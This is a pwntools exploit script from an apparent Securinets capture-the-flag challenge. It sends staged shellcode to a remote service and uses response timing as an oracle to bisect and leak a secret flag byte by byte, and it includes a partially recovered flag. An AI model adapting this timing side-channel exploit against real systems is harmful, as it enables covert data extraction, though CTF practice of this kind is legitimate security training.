#!/usr/bin/env python3
import os

from pwn import *


def connect():
    if args.GDB:
        return gdb.debug(["share/main2"], api=True)
    if args.LOCAL:
        return process(["share/main2"])
    else:
        return remote("pwn.securinets.tn", 7000)


def oracle(idx, op, val):
    subprocess.check_call(["make", "fmt", "clean", "all", f"EXTRA_CFLAGS=-DIDX={idx} -DOP='{op}' -DVAL={val}"])
    with open("stage1.bin", "rb") as fp:
        stage1 = fp.read()
    assert len(stage1) <= 11
    with open("stage2.bin", "rb") as fp:
        stage2 = fp.read()
    assert len(stage2) <= 0xff
    with connect() as tube:
        tube.send(stage1 + stage2)
        t0 = time.time()
        tube.send(b"A")
        tube.recvall(timeout=1)
        dt = time.time() - t0
        result = dt < 0.9
        print(f"[{idx}] {op} {val}: {result} ({dt})")
        return result


def bisect(idx):
    left = 0
    right = 255
    while left <= right:
        middle = (left + right) // 2
        if oracle(idx, "<", middle):
            right = middle - 1
        elif oracle(idx, ">", middle):
            left = middle + 1
        else:
            return middle
    raise RuntimeError()


def main():
    flag = "Securinets{96fe09hdl48p941f77fk88}"
    for i, c in enumerate(flag):
        assert(oracle(i, "==", ord(c)))
    i = len(flag)
    while True:
        flag += chr(bisect(i))
        print(f"{flag=}")
        i += 1


if __name__ == "__main__":
    main()
